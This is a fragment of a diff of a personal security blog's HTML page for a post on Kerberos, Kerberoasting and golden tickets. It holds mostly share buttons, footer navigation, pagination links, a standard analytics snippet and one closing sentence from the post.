be%20even%20in%20greater%20detail%29%2c%20so%20definitely%20have%20a%20look%20around%21%3c%2fp%3e" aria-label="Tumblr">
-      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f01%2f09%2fkerberos-kerberoast-and-golden-tickets%2f&t=kerberos%2c%20kerberoast%20and%20golden%20tickets" aria-label="Hacker News">
-      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-      
-        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
-          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
-          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
-          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
-          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+<p>I think there is still a loooong road ahead for the Microsoft Kerberos Implementations&mldr; Until they &lsquo;fix&rsquo; this stuff, things should remain interesting for quite some time to come.</p>
 </div>
-
-
-  <footer id="footer">
-  <div class="footer-left">
-    Copyright  &copy; 2021  Leon Jacobs 
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-        <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-        <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-        <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </nav>
-  </div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Read other posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button previous">
+<a href=https://leonjza.github.io/blog/2016/06/16/rooting-darknet/>
+<span class=button__icon>←</span>
+<span class=button__text>rooting darknet</span>
+</a>
+</span>
+<span class="button next">
+<a href=https://leonjza.github.io/blog/2015/09/30/a-totally-unnecessary-composer-shell/>
+<span class=button__text>a totally unnecessary composer shell</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
+</div>
 </footer>
-
-
-  </div>
+<script src=https://leonjza.github.io/assets/main.js></script>
+<script src=https://leonjza.github.io/assets/prism.js></script>
+</div>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
 </body>
-
-<link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
-<script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
-<script src=https://leonjza.github.io/js/main.js></script>
-<script src=https://leonjza.github.io/js/code-copy.js></script>
-
-
-
 </html>
